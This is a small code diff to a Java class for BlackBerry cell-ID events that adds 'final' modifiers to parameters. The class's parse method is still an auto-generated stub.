@@ -9,7 +9,7 @@ package blackberry.event;
 
 public class CellIdEvent extends Event {
 
-    public CellIdEvent(int actionId, byte[] confParams) {
+    public CellIdEvent(final int actionId, final byte[] confParams) {
         super(Event.EVENT_CELLID, actionId, confParams);
     }
 
@@ -18,7 +18,7 @@ public class CellIdEvent extends Event {
 
     }
 
-    protected boolean parse(byte[] confParams) {
+    protected boolean parse(final byte[] confParams) {
         // TODO Auto-generated method stub
         return false;
     }
